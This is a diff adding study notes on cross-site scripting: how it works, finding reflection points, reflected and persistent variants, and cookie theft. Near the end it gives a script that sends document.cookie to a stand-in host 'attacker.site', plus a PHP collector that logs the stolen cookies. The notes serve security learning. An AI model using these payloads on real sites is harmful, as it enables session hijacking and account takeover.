@@ -1,0 +1,118 @@
+Cross Site Scripting
+
+	- vulnerability that lets an attacker control some of the content of a web application 
+	- by exploiting an XSS, the attacker can target the web application users 
+
+	- by using XSS, an attacker can: 
+		- modify the content of the site at run-time
+		- inject malicious contents 
+		- steal the cookies, thus the session, of a user
+		- perform actions on the web application as if it was a legitimate user 
+
+XSS Actors 
+
+	- actors involved XSS attack: 
+		- vulnerable web site 
+		- victim user (visitor of the website)
+		- pentester 
+
+	- vulnerable web applications: 
+		- VWA is what makes XSS attacks 
+		- vulnerabilities happen when a web application uses "unfiltered user input OR build the output content" displayed to its end users; lets an attacker control the output of HTML and Javascript code, thus attacking the application users 
+
+		- thiskind of attack... any parameter coming from the client side of the web app: 
+			- request headers 
+			- cookies
+			- form inputs 
+			- POST parameters 
+			- GET parameters 
+				- input channels should be validated SERVER SIDE by well-implemented security functions that should sanitize or filters users' input 
+				- only way to prevent XSS is to NEVER, EVER TRUST USER INPUT
+	- users
+		- most of the time users or visitors are the victims 
+		- XSS involves injecting malicious code into the output of a webpage
+		- malicious code -> rendered (executed) -> by browser 
+		- developers tend to consider XSS as low priority because most researchers just do basic pop up windows 
+		- most of the time the users can't really tell it's an attack since it so subtle 	
+
+	- attackers 
+		- scenario: attacker steals the cookie of an authenticated web site admin
+
+	- finding an XSS	
+		1. look at EVERY user input and test if it is somehow displayed on the output of the web application 
+		2. search parameter is submitted through a form and gets displayed on the output (REFLECTION POINT)
+			2a. searched string is passed to the web application through a GET parameter
+		3. after finding a reflection point, understand if you can inject HTML code and see if it somehow gets the output of the page -> lets you control the output of the page! 
+			3a. can use a valid HTML tag and try to understand if it gets to the page
+			3b. looking at the HTML sources of the output page helps to understand how to build an XSS payload 
+		4. matter of injecting harmless tags 
+			4a. <i>, <pre>, <plaintext> 
+		5. to test XSS you can inject some valid HTML/Javascript code
+			- ex. <script>alert('XSS')</script> 
+
+
+		- to exploit an XSS vulnerabilty that you find you need to: 
+			- need to know the TYPE of XSS attack you are carrying out 
+			- XSS attacks can be REFLECTED, PERSISTENT, DOM BASED
+
+	****- REFLECTED XSS ATTACKS ****
+
+		- when malicious payload is carried "INSIDE THE REQUEST" that the browser of the victim sends to the vulnerable website 
+
+		- could be triggered by posting a link on social network or via a phishing campaign. when users click on the link they trigger the attack 
+
+		- in example can craft al inke to the search page and embed the payload in the "find GET" parameter
+
+			- ex. http://victim.site/search.php?find=<payload> 
+
+		- the attack is called REFLECTED because an input field of the HTTP request sent by the browser gets immediately reflected to the output page 
+
+	- reflected XSS filters 
+
+		- some browsers have 'reflected xss filters' built in & will not run some xss reflected attacks 
+
+		- they can only filter trivial and known XSS attacks
+		- there are advanced attacks that can bypass anti-xss filters 
+		- filters cannot block persistent XSS attacks 
+
+
+	****- PERSISTENT XSS ATTACKS ****
+
+		- occurs when the payload is sent to the vulnerable web server and then STORED
+		- when web page of vulnerable website pulls the stored  malicious code and puts it in the HTML output, it will deliver the XSS payload 
+
+		- called persistent because the malicious code gets delivered each and everytime a web browser hits the "injected" web page 
+
+		- single attack the hacker can exploit multiple web apps users 
+
+		- most common vector for persistent attacks are HTML forms tha tsubmit content to the web server and then display that content back to the users 
+
+			- ex. elements like comments, users profiles, and forum posts are a potential vector for XSS attacks 
+
+	****- COOKIE STEALING VIA XSS **** 
+
+		- javascript can access cookies if they do not have the HttpOnly flag ENABLED
+		- means that XSS attack can be used to steal cookies 
+		- stealing cookies = user session 
+
+		- can display document current cookies with: 
+			- ex. <script>alert(document.cookie)</script> 
+
+		- with the following code you can send cookies content to an attacker-controlled site: 
+			<script> 
+			var i = new Image (); 
+			i.src="http://attacker.site/log.php?q="+document.cookie;
+			</script> 
+				- script generates an image object and points its SRC to a script on the attacker's server (attacker.site)
+				- ex. "http://attacker.site/log.php?q="+document.cookie 
+				- browser cannot tell in advance if the source is a real image. cookie is actually sent to the attacker site 
+
+		- this log.php script saves the cookie in a text file on the attacker.site
+
+			<?php
+			$filename="/tmp/log.txt";
+			$fp=fopen($filename, 'a');
+			$cookie=$_GET['q'];
+			fwrite($fp, $cookie);
+			fclose($fp);
+			?> 
